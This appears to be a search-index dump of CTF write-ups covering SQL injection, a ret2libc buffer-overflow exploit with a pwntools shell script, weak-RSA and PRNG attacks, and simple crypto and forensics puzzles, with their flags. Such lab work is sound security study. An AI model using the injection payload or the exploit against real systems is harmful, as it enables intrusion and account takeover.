COMMIT at the end:\nx\", \"x\"); UPDATE users SET password=\"$2b$12$lUMUckkeJqTGd.2ffCNH/uHuqmvId5PtzayQgYX4jBsYE6RUSFiNO\"; COMMIT-- -  After that, we can access as admin using asdf as password:\nFlag And there we have the flag (HTB{N3ST3D_QU3R1E5_AR3_5CARY!!!}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/horror-feeds/","section":"ctf","summary":"Stack-based SQL injection","time":3,"title":"Horror Feeds"},{"contents":"We are given a Python code to encrypt the flag (source.py), and we are also given dialog.txt and encrypted_messages.txt:\nimportos withopen('super_secret_messages.txt', 'r') asf: SUPER_SECRET_MESSAGES=[msg.strip() formsginf.readlines()] defderiveKey(key): derived_key=[] fori, charinenumerate(key): previous_letters=key[:i] new_number=1 forj, previous_charinenumerate(previous_letters): ifprevious_char\u0026gt;char: derived_key[j] +=1 else: new_number+=1 derived_key.append(new_number) returnderived_key deftranspose(array): return[rowforrowinmap(list, zip(*array))] defflatten(array): return\"\".join([iforsubinarrayforiinsub]) deftwistedColumnarEncrypt(pt, key): derived_key=deriveKey(key) width=len(key) blocks=[pt[i:i+width] foriinrange(0, len(pt), width)] blocks=transpose(blocks) ct=[blocks[derived_key.index(i+1)][::-1] foriinrange(width)] ct=flatten(ct) returnct classPRNG: def__init__(self, seed): self.p=0x2ea250216d705 self.a=self.p self.b=int.from_bytes(os.urandom(16), 'big') self.rn=seed defnext(self): self.rn=((self.a*self.rn) +self.b) %self.p returnself.rn defmain(): seed=int.from_bytes(os.urandom(16), 'big') rng=PRNG(seed) cts=\"\" formessageinSUPER_SECRET_MESSAGES: key=str(rng.next()) ct=twistedColumnarEncrypt(message, key) cts+=ct+\"\\n\" withopen('encrypted_messages.txt', 'w') asf: f.write(cts) dialog=\"Miyuki says:\\n\" dialog+=\"Klaus it's your time to sign!\\n\" dialog+=\"All we have is the last key of this wierd encryption scheme.\\n\" dialog+=\"Please do your magic, we need to gather more information if we want to defeat Draeger.\\n\" dialog+=f\"The key is: {str(key)}\\n\" withopen('dialog.txt', 'w') asf: f.write(dialog) if__name__=='__main__': main()  Miyuki says: Klaus it's your time to sign! All we have is the last key of this wierd encryption scheme. Please do your magic, we need to gather more information if we want to defeat Draeger. The key is: 148823505998502  ETYDEDTYAATOSTTUFTEETHIVHMVOSFNANDHEGIIIOCESTHTCHDHNRNYALSRPDAIRDCEEIFREEEEOETLRTRNLEEUNBEOIPYLTNOVEOAOTN EECNEMOTCYSSSEORIRCETFDUCEDAATAPATWTTSKTTRROCEANHHHAIHOGPTTGROIEETURAFYUIPUEEONOISECNJISAFALRIUAVSAAVPDES GTNOERUTOIAOTIGRESHHBTSEHLORSRSSNTWINTEAUEENTAEEENOICCAFOSHDORLUFHRIALNGOYPNCEIGTAYAPETHCEOUATEFISTFBPSVK SNUTCAGPEEPWLHITEDFNDMPNWSHFORSLEOAIPTAPEOOOAOTGOSESNADRITRAEREOSSNPECUHSNHENSAATETTPSIUIUOOHPNSKTNIRYHFT WFAFDDSGIMMYTADNHRENINONSRSUMNITAHIANSUOEMAAEDAIFLOTFINEAYNEGYSNKROEOGFTCTNLYIIOODLOIRERVTAROTRROUNUTFAUP  The idea here is to reverse the algorithm, let\u0026rsquo;s review what it does:\n It generates a seed with a custom Pseudo Random Number Generator (PRNG) and uses the next iteration as the key for the encryption algorithm It derives a new key using a custom function deriveKey Separates the message in blocks of the same width Transposes the blocks (i.e. [[1, 2], [3, 4]] becomes [[1, 3], [2, 4]]) Then it takes each element of the derived key to sort the blocks and reverse each block Finally, it flattens the list of blocks to a single list (i.e. [[1, 2], [3, 4]] becomes [1, 2, 3, 4])  Let\u0026rsquo;s start by analyzing the PRNG implementation:\nclassPRNG: def__init__(self, seed): self.p=0x2ea250216d705 self.a=self.p self.b=int.from_bytes(os.urandom(16), 'big') self.rn=seed defnext(self): self.rn=((self.a*self.rn) +self.b) %self.p returnself.rn  The next function has a bad implementation, since ((self.a * self.rn) + self.b) % self.p equals self.b % self.p, and self.b is a fix value. So, next always returns the same value, and we have this in dialog.txt: 148823505998502.\nNow, let\u0026rsquo;s try to reverse the encryption in twistedColumnarEncrypt:\ndeftwistedColumnarEncrypt(pt, key): derived_key=deriveKey(key) width=len(key) blocks=[pt[i:i+width] foriinrange(0, len(pt), width)] blocks=transpose(blocks) ct=[blocks[derived_key.index(i+1)][::-1] foriinrange(width)] ct=flatten(ct) returnct  Since we know the key, and it is always the same, the derived key will be always the same too. Hence, the width of the blocks is constant, so we can start by separating the ciphertext into blocks:\ndeftwisted_columnar_decrypt(ct, key): derived_key=derive_key(key) width=len(key) length=len(ct) //len(key) blocks=[list(ct[i:i+length]) foriinrange(0, len(ct), length)]  Notice that length is not width, because of the transposition. The relationship between length and width is: len(ct) = length * width.\nNow, we need to assign the plaintext at the index of derived key, the corresponding block reversed. It can be a little confusing, but is just the reverse operation. Finally, transpose and flatten the list of blocks:\ndeftwisted_columnar_decrypt(ct, key): derived_key=derive_key(key) width=len(key) length=len(ct) //len(key) blocks=[list(ct[i:i+length]) foriinrange(0, len(ct), length)] pt=blocks.copy() foriinrange(width): pt[derived_key.index(i+1)] =blocks[i][::-1] pt=transpose(pt) pt=flatten(pt) returnpt  We only need to read the given files and do the decryption. This is the plain text:\n$ python3 solve.py THELOCATIONOFTHECONVOYDANTEISDETERMINEDTOBEONTHETHIRDPLANETAFTERVINYRYOUCANUSELIGHTSPEEDAFTERTHEDELIVERYS THECARGOISSAFEWENEEDTOMOVEFASTCAUSETHERADARSAREPICKINGUPSUSPICIOUSACTIVITYAROUNDTHETRAJECTORYOFTHEPLANETA BECAREFULSKOLIWHENYOUARRIVEATTHEPALACEOFSCIONSAYTHECODEPHRASETOGETINHTBTHISRNGISNOTSAFEFORGENETINGOUTPUTS DONTFORGETTOCHANGETHEDARKFUELOFTHESPACESHIPWEDONTWANTANYUNPLEASANTSURPRISESTOHAPPENTHISSERIOUSMISSIONPOPO IFYOUMESSUPAGAINILLSENDYOUTOTHEANDROIDGRAVEYARDTOSUFFERFROMTHECONSTANTTERMINATIONOFYOURKINDAFINALWARNINGM $ python3 solve.py | grep -E HTB.+ BECAREFULSKOLIWHENYOUARRIVEATTHEPALACEOFSCIONSAYTHECODEPHRASETOGETINHTBTHISRNGISNOTSAFEFORGENETINGOUTPUTS  So the flag is: HTB{THISRNGISNOTSAFEFORGENETINGOUTPUTS}.\nThe full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/how-the-columns-have-turned/","section":"ctf","summary":"Reverse encryption algorithm","time":3,"title":"How The Columns Have Turned"},{"contents":"We are given a 64-bit binary called htb-console:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Reverse engineering If we use Ghidra, we will see the following main function:\nvoidmain() { charcommand[16]; setup(); puts(\"Welcome HTB Console Version 0.1 Beta.\"); do{ printf(\"\u0026gt;\u0026gt; \"); fgets(command, 16, stdin); console(command); memset(command, 0, 16); } while(true); }  The above code only asks for user input and passes the string to console:\nvoidconsole(char*command) { intres; charflag[16]; res =strcmp(command, \"id\\n\"); if(res ==0) { puts(\"guest(1337) guest(1337) HTB(31337)\"); } else{ res =strcmp(command, \"dir\\n\"); if(res ==0) { puts(\"/home/HTB\"); } else{ res =strcmp(command, \"flag\\n\"); if(res ==0) { printf(\"Enter flag: \"); fgets(flag, 48, stdin); puts(\"Whoops, wrong flag!\"); } else{ res =strcmp(command, \"hof\\n\"); if(res ==0) { puts(\"Register yourself for HTB Hall of Fame!\"); printf(\"Enter your name: \"); fgets(name, 10, stdin); puts(\"See you on HoF soon! :)\"); } else{ res =strcmp(command, \"ls\\n\"); if(res ==0) { puts(\"- Boxes\"); puts(\"- Challenges\"); puts(\"- Endgames\"); puts(\"- Fortress\"); puts(\"- Battlegrounds\"); } else{ res =strcmp(command, \"date\\n\"); if(res ==0) { system(\"date\"); } else{ puts(\"Unrecognized command.\"); } } } } } } }  Buffer Overflow vulnerability There\u0026rsquo;s a Buffer Overflow vulnerability in the above code, since flag is a character array of 16 bytes, but using command flag we can enter up to 48 bytes, causing an overflow and overwriting values on the stack.\nThis is a security issue because the stack stores data used by the program to follow the execution flow. For instance, we can find the saved return address to main in order to return at the end of the console function.\nWith the Buffer Overflow vulnerability, we will be able to modify that saved return address and thus control program execution. Let\u0026rsquo;s use GDB to find the amount of bytes needed to achieve that (also known as offset):\n$ gdb -q htb-console Reading symbols from htb-console... (No debugging symbols found in htb-console) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./htb-console Welcome HTB Console Version 0.1 Beta. \u0026gt;\u0026gt; flag Enter flag: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa Whoops, wrong flag! Program received signal SIGSEGV, Segmentation fault. 0x0000000000401396 in ?? ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 24 (little-endian search) likely [+] Found at offset 17 (big-endian search)  Obviously, we got a segmentation fault, but we found out that we need exactly 24 bytes to reach the position of the return address saved in the stack.\nRet2Libc attack The next step to exploit the binary is find a nice address to return. Since NX is enabled, we must use Return Oriented Programming (ROP) in order to execute arbitrary code. The common technique is Ret2Libc, whose objective is to call system(\u0026quot;/bin/sh\u0026quot;).\nLuckily, system is a function already linked to the binary since it is used in the date command, so we can call it using the Procedure Linkage Table (PLT). Furthermore, since PIE is disabled, the address of system at the PLT is fix (0x401040):\n$ objdump -M intel -d htb-console | grep system 0000000000401040 \u0026lt;system@plt\u0026gt;: 401381: e8 ba fc ff ff call 401040 \u0026lt;system@plt\u0026gt;  Now we need to load the string \u0026quot;/bin/sh\u0026quot; as the first parameter to system. In x86_64 programs, $rdi register is used to hold the first parameter. In order to set this register to the value we want, we will use a gadget pop rdi; ret. A gadget is just a set of instructions that end in ret. This is useful in Return Oriented Programming, since the stack will be filled with gadget addresses that are executed consecutively due to ret will return to the next address saved in the stack (that\u0026rsquo;s why this kind of payload is called ROP chain).\nWe can use ROPgadget to find such gadget. Again, since PIE is disabled, the address is fix (0x401473):\n$ ROPgadget --binary htb-console | grep 'pop rdi ; ret' 0x0000000000401473 : pop rdi ; ret  Alright, the last piece we need is the address of \u0026quot;/bin/sh\u0026quot;. Typically, one would use Glibc to get this string. This time, we will take advantage ot a program\u0026rsquo;s feature. There\u0026rsquo;s a global variable called name where we can store data (command hof). Since it is a global variable and PIE is disabled, its address is fix:\ngef➤ run Starting program: ./htb-console Welcome HTB Console Version 0.1 Beta. \u0026gt;\u0026gt; hof Register yourself for HTB Hall of Fame! Enter your name: asdf See you on HoF soon! :) \u0026gt;\u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7ecafd2 in __GI___libc_read (fd=0x0, buf=0x7ffff7fa9a03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;, nbytes=0x1) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  gef➤ grep asdf [+] Searching 'asdf' in memory [+] In './htb-console'(0x404000-0x405000), permission=rw- 0x4040b0 - 0x4040b6 → \"asdf\\n\"  So we will use address 0x4040b0 to store the string \u0026quot;/bin/sh\u0026quot;.\nFinal exploit To sum up, this will be the ROP chain:\ndefmain(): p=get_process() pop_rdi_ret_addr=0x401473 name_addr=0x4040b0 system_call_addr=0x401381 offset=24 junk=b'A'*offset payload=junk payload+=p64(pop_rdi_ret_addr) payload+=p64(name_addr) payload+=p64(system_call_addr) p.sendlineafter(b'\u0026gt;\u0026gt; ', b'hof') p.sendlineafter(b'Enter your name: ', b'/bin/sh\\0') p.sendlineafter(b'\u0026gt;\u0026gt; ', b'flag') p.sendlineafter(b'Enter flag: ', payload) p.recv() p.interactive()  If we run it locally, we get a shell:\n$ python3 solve.py [*] './htb-console' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './htb-console': pid 2748889 [*] Switching to interactive mode $ ls htb-console solve.py  Flag So let\u0026rsquo;s go remote:\n$ python3 solve.py 167.99.90.155:30955 [*] './htb-console' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to 167.99.90.155 on port 30955: Done [*] Switching to interactive mode $ ls console flag.txt $ cat flag.txt HTB{fl@g_a$_a_s3rv1c3?}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/htb-console/","section":"ctf","summary":"64-bit binary. Buffer Overflow. Ret2Libc","time":5,"title":"HTB Console"},{"contents":"We are given this string with only A and B letters:\nABAAAABABAABBABBAABBAABAAAAAABAAAAAAAABAABBABABBAAAAABBABBABABBAABAABABABBAABBABBAABB  The challenge says that it smells like bacon. In fact, there is Bacon Cipher and we can use it to decrypt the string in CyberChef:\nSo the flag is: CTFlearn{ILOUEBACONDONTYOU}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/hyperstream-test-2/","section":"ctf","summary":"Bacon Cipher","time":1,"title":"HyperStream Test #2"},{"contents":" getProblemPdf('en', '1999', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-1999/","section":"imc","summary":null,"time":1,"title":"IMC 1999, Problem 1"},{"contents":" getProblemPdf('en', '1999', '7') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-7-1999/","section":"imc","summary":null,"time":1,"title":"IMC 1999, Problem 7"},{"contents":" getProblemPdf('en', '2000', '3') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-3-2000/","section":"imc","summary":null,"time":1,"title":"IMC 2000, Problem 3"},{"contents":" getProblemPdf('en', '2004', '7') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-7-2004/","section":"imc","summary":null,"time":1,"title":"IMC 2004, Problem 7"},{"contents":" getProblemPdf('en', '2004', '8') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-8-2004/","section":"imc","summary":null,"time":1,"title":"IMC 2004, Problem 8"},{"contents":" getProblemPdf('en', '2005', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2005/","section":"imc","summary":null,"time":1,"title":"IMC 2005, Problem 1"},{"contents":" getProblemPdf('en', '2005', '8') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-8-2005/","section":"imc","summary":null,"time":1,"title":"IMC 2005, Problem 8"},{"contents":" getProblemPdf('en', '2006', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2006/","section":"imc","summary":null,"time":1,"title":"IMC 2006, Problem 1"},{"contents":" getProblemPdf('en', '2007', '7') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-7-2007/","section":"imc","summary":null,"time":1,"title":"IMC 2007, Problem 7"},{"contents":" getProblemPdf('en', '2010', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2010/","section":"imc","summary":null,"time":1,"title":"IMC 2010, Problem 1"},{"contents":" getProblemPdf('en', '2012', '2') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-2-2012/","section":"imc","summary":null,"time":1,"title":"IMC 2012, Problem 2"},{"contents":" getProblemPdf('en', '2013', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2013/","section":"imc","summary":null,"time":1,"title":"IMC 2013, Problem 1"},{"contents":" getProblemPdf('en', '2013', '6') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-6-2013/","section":"imc","summary":null,"time":1,"title":"IMC 2013, Problem 6"},{"contents":" getProblemPdf('en', '2017', '6') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-6-2017/","section":"imc","summary":null,"time":1,"title":"IMC 2017, Problem 6"},{"contents":" getProblemPdf('en', '2018', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2018/","section":"imc","summary":null,"time":1,"title":"IMC 2018, Problem 1"},{"contents":" getProblemPdf('en', '2019', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2019/","section":"imc","summary":null,"time":1,"title":"IMC 2019, Problem 1"},{"contents":" getProblemPdf('en', '2019', '2') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-2-2019/","section":"imc","summary":null,"time":1,"title":"IMC 2019, Problem 2"},{"contents":" getProblemPdf('en', '2019', '5') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-5-2019/","section":"imc","summary":null,"time":1,"title":"IMC 2019, Problem 5"},{"contents":" getProblemPdf('en', '2019', '7') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-7-2019/","section":"imc","summary":null,"time":1,"title":"IMC 2019, Problem 7"},{"contents":" getProblemPdf('en', '2020', '2') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-2-2020/","section":"imc","summary":null,"time":1,"title":"IMC 2020, Problem 2"},{"contents":" getProblemPdf('en', '2021', '1') ","image":null,"permalink":"https://7rocky.github.io/en/imc/problem-1-2021/","section":"imc","summary":null,"time":1,"title":"IMC 2021, Problem 1"},{"contents":"We are given a Python with a weird RSA implementation (fastprimes.py):\n#!/usr/bin/env python #********************************************************************** # filename: fasterprimes.py # version: 0.06.2-alpha # release date: 20170806 # dev: Cayce Pollard # qa: NOT PASSED, open defects. # finds a specified length prime, then a neighbouring prime for speed.  # DEFECTS # ID[243], category A4, owner: CayceP, comment: may have to be run several times to generate valid RSA values # ID[552], category A9, owner: AppSec, comment: Doneighbouring primes present a security risk? #********************************************************************** fromCrypto.Utilimportnumber fromCrypto.PublicKey.RSAimportconstruct fromCrypto.PublicKeyimportRSA importsympy defegcd(a, b): ifa==0: return(b, 0, 1) else: g, x, y=egcd(b%a, a) return(g, y-(b//a) *x, x) defgetPQ(): n_length=512#generates a 1024 bit key. whileTrue: firstprime=number.getPrime(n_length) #let's get our first number lowerp=firstprime-10 upperp=firstprime+10 forxinrange(lowerp,upperp): #getPrime takes too long so we'll find a nearby prime for q ifx==firstprime: continue else:  ifsympy.isprime(x): secondprime=x returnfirstprime, secondprime break return1, 1  e=65537 whileTrue: p, q=getPQ()  ifp==1: print(\"still trying\") else: break n=p*q#we make our modulus phi=(p-1)*(q-1) #this one is for making the private key gcd, d, b=egcd(e, phi) #now we have all our RSA values.  key_params=(long(n), long(e), long(d)) key=RSA.construct(key_params) printkey.exportKey() printkey.publickey().exportKey() #keep the pre-shared key below 100 bytes.  message=#put the message here. #message = [ord(c) for c in message] #comment out if message is int. #message = int(''.join(map(str,message))) print('message: ', message) RSAsecret=key.encrypt(int(message),'') #check the encryption works  print('RSAsecret: ', RSAsecret) #send this to the recipient print('message: ', message) #don't send this you idiot. print('Secret check:', key.decrypt(RSAsecret)) #check the message matches the decrypted message/  We also have another code that generates a 128-bit key (16 bytes) for AES (AESbootstrap.py):\n#!/usr/bin/env python #********************************************************************** # filename: AESbootstrap.py # version: 0.11.7-alpha # release date: 20170801 # dev: Cayce Pollard # qa: Jonathan Norrell # instantiate mersenne each time, feed it every 3 digits of the shared secret # to establish a shared AES128 key. # #********************************************************************** #textbook mersenne twister from https://en.wikipedia.org/wiki/Mersenne_Twister#Python_implementation(no rolling your own!) classmersenne(object): def__init__(self, seed): # Initialize the index to 0 self.index=624 self.mt=[0] *624 self.mt[0] =seed# Initialize the initial state to the seed foriinrange(1, 624): initval=int(0xFFFFFFFF\u0026amp;(1812433253*(self.mt[i-1] ^self.mt[i-1] \u0026gt;\u0026gt;30) +i)) # print(initval) self.mt[i] =initval defextract_number(self): ifself.index\u0026gt;=624: self.twist() y=self.mt[self.index] # Right shift by 11 bits y=y^y\u0026gt;\u0026gt;11 # Shift y left by 7 and take the bitwise and of 2636928640 y=y^y\u0026lt;\u0026lt;7\u0026amp;2636928640 # Shift y left by 15 and take the bitwise and of yand 4022730752 y=y^y\u0026lt;\u0026lt;15\u0026amp;4022730752 # Right shift by 18 bits y=y^y\u0026gt;\u0026gt;18 self.index=self.index+1 returnint(0xFFFFFFFF\u0026amp;y) deftwist(self): foriinrange(624): # Get the most significant bit and add it to the less significant # bits of the next number y=int(0xFFFFFFFF\u0026amp;((self.mt[i] \u0026amp;0x80000000) +(self.mt[(i+1) %624] \u0026amp;0x7fffffff))) self.mt[i] =self.mt[(i+397) %624] ^y\u0026gt;\u0026gt;1 ify%2!=0: self.mt[i] =self.mt[i] ^0x9908b0df self.index=0 #test #****************************************************************************** #test tool: #use this to convert a triplet from the decoded value as seedval #do this across each of the values to check the candidate against the AESkey. #****************************************************************************** defgen_and_check(genseed): # make an object x=mersenne(genseed) y=(x.extract_number() \u0026amp;0xFF) #only interested in LSBs. Use the mask as we don'tcare about the rest returny#candidate for comparison. list=str(bin(gen_and_check(seedval))) candidate=list[2::] candidate=candidate.zfill(8)  There is an email where we can find the purpose of the above scripts, as well as the public key for RSA and the ciphertext:\nFrom:\tCayceP \u0026lt;cayce.pollard@\u0026gt; Sent:\t11 August 2017 18:15 To:\tDeschain, Roland Subject:\tProgress update Hi Rolly, Just a quick update. We've addressed your issues with the numpy PSNG by ditching it and created a mersenne twister from scratch. This will be used as the pre-secret from the RSA exchange for bootstrapping the AES comms. We have some problems with the RSA generator that we're ironing out. Security have some questions around the way primes are chosen but I think they're just getting in the way. To prove it's working just fine I've sent your private key through secure comms and your public key is below with the message; we've also used this to encrypt a pre-shared secret. Can you decrypt with your private key and check the pre-shared key works with the twister? Have a good weekend, CayceP -----BEGIN PUBLIC KEY----- MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFbDk+zYy1tbjwPpsTWbYjIfBtZk walARbJxLg6QhyalsGnBx064VFIH9XIKzPK/Dt1RzMO68gy7zLOiyipPtYb2n0M6 WcdDGgw9J9+xx4HjXZCHx4h4zQhfQeOYymeSPewXJOe+GT31ymz6/Q1Ulyq/jWnD XZogxfbXi6bIwuN7AgMBAAE= -----END PUBLIC KEY----- -----BEGIN MESSAGE----- 41296290787170212566581926747559000694979534392034439796933335542554551981322424774631715454669002723657175134418412556653226439790475349107756702973735895193117931356004359775501074138668004417061809481535231402802835349794859992556874148430578703014721700812262863679987426564893631600671862958451813895661 -----END MESSAGE-----  The RSA cryptosystem is vulnerable because the way to get $n = p \\cdot q$ and both prime numbers are really close to each other:\ndefgetPQ(): n_length=512#generates a 1024 bit key. whileTrue: firstprime=number.getPrime(n_length) #let's get our first number lowerp=firstprime-10 upperp=firstprime+10 forxinrange(lowerp,upperp): #getPrime takes too long so we'll find a nearby prime for q ifx==firstprime: continue else:  ifsympy.isprime(x): secondprime=x returnfirstprime, secondprime break return1, 1  e=65537 whileTrue: p, q=getPQ()  ifp==1: print(\"still trying\") else: break n=p*q#we make our modulus  Hence, we can find $p$ and $q$ as the prime numbers that are closest to $\\sqrt{n}$ from above and from below ($q \\leq \\sqrt{n} \\leq p$). Then, we can make sure that $n = p \\cdot q$.\nThe above can be done easily with Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.PublicKey import RSA \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import isPrime \u0026gt;\u0026gt;\u0026gt; from gmpy2 import iroot \u0026gt;\u0026gt;\u0026gt; key = RSA.import_key('''-----BEGIN PUBLIC KEY----- ... MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFbDk+zYy1tbjwPpsTWbYjIfBtZk ... walARbJxLg6QhyalsGnBx064VFIH9XIKzPK/Dt1RzMO68gy7zLOiyipPtYb2n0M6 ... WcdDGgw9J9+xx4HjXZCHx4h4zQhfQeOYymeSPewXJOe+GT31ymz6/Q1Ulyq/jWnD ... XZogxfbXi6bIwuN7AgMBAAE= ... -----END PUBLIC KEY----- ... ''') \u0026gt;\u0026gt;\u0026gt; key.e 65537 \u0026gt;\u0026gt;\u0026gt; key.n 60927735877056559130803069919621859729817223816091468870468728150535102345085544195001142179497747300756976118359991531766104121379004146329976732080428122272205922112100073487631152244297343150154109815442681320311122134731991282281969152492933055882377304091844616671159896354284349735375653609635116671867 \u0026gt;\u0026gt;\u0026gt; p = iroot(key.n, 2)[0] \u0026gt;\u0026gt;\u0026gt; while not isPrime(p): ... p += 1 ... \u0026gt;\u0026gt;\u0026gt; q = p - 1 \u0026gt;\u0026gt;\u0026gt; while not isPrime(q): ... q -= 1 ... \u0026gt;\u0026gt;\u0026gt; assert key.n == p * q  Moreover, we can decrypt the ciphertext:\n\u0026gt;\u0026gt;\u0026gt; c = 41296290787170212566581926747559000694979534392034439796933335542554551981322424774631715454669002723657175134418412556653226439790475349107756702973735895193117931356004359775501074138668004417061809481535231402802835349794859992556874148430578703014721700812262863679987426564893631600671862958451813895661 \u0026gt;\u0026gt;\u0026gt; phi_n = (p - 1) * (q - 1) \u0026gt;\u0026gt;\u0026gt; d = pow(key.e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, key.n) \u0026gt;\u0026gt;\u0026gt; hex(m) '0x48843fc15819e23660c1cd16a573aff247f7024d18eaae397d0896f103ac' \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'H\\x84?\\xc1X\\x19\\xe26`\\xc1\\xcd\\x16\\xa5s\\xaf\\xf2G\\xf7\\x02M\\x18\\xea\\xae9}\\x08\\x96\\xf1\\x03\\xac' \u0026gt;\u0026gt;\u0026gt; len(bytes.fromhex(hex(m)[2:])) 30  The result we get is the seed for AESbootstrap.py, which is a custom PRNG Mersenne Twister implementation. The header of the script tells to use the seed as a decimal number splitted in three-digit numbers. Therefore, we need this:\nm_str=str(m) m_numbers=[int(m_str[i:i+3]) foriinrange(0, len(m_str), 3)] flag='' form_ninm_numbers: list=str(bin(gen_and_check(m_n))) candidate=list[2::] candidate=candidate.zfill(8) flag+=chr(int(candidate, 2)) print(flag)  And we get a Base64-encoded string:\n$ python3 solve.py ZmxhZz1Ccm9rM25fRzRtZQ== $ python3 solve.py | base64 -d flag=Brok3n_G4me  And the flag is: HTB{Brok3n_G4me}.\nThe full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/infinite-descent/","section":"ctf","summary":"RSA. Close primes. PRNG","time":5,"title":"Infinite Descent"},{"contents":"We are given a JPEG image called cat.jpg:\nThe file is recognized as a proper JPEG image:\n$ file cat.jpg cat.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3  However, if we extract the file metadata, we will see something strange:\n$ exiftool cat.jpg ExifTool Version Number : 12.30 File Name : cat.jpg Directory : . File Size : 858 KiB File Modification Date/Time : File Access Date/Time : File Inode Change Date/Time : File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.02 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617 Copyright Notice : PicoCTF Application Record Version : 4 XMP Toolkit : Image::ExifTool 10.80 License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 Rights : PicoCTF Image Width : 2560 Image Height : 1598 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 2560x1598 Megapixels : 4.1  The License field seems to have a Base64 payload, let\u0026rsquo;s decode it:\n$ echo cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 | base64 -d picoCTF{the_m3tadata_1s_modified}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/forensics/information/","section":"ctf","summary":"picoCTF 2021. 10 points. File metadata","time":1,"title":"information"},{"contents":"We have this game:\n$ nc 206.189.125.243 30182 1. Instructions 2. Play \u0026gt; 1 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 [*] Help the 🤖 reach the 💎. 🔩 🔩 [*] You need to find the shortest route. 🔩 🔩 [*] You need to collect 500 💎 and at least 5000 🔩. 🔩 🔩 [*] The solution should be given in the format: DLR (Down, Left, Right) 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 🔩 1. Instructions 2. Play \u0026gt; 2 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🤖 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 🔩 🔩 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ ☠️ ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ 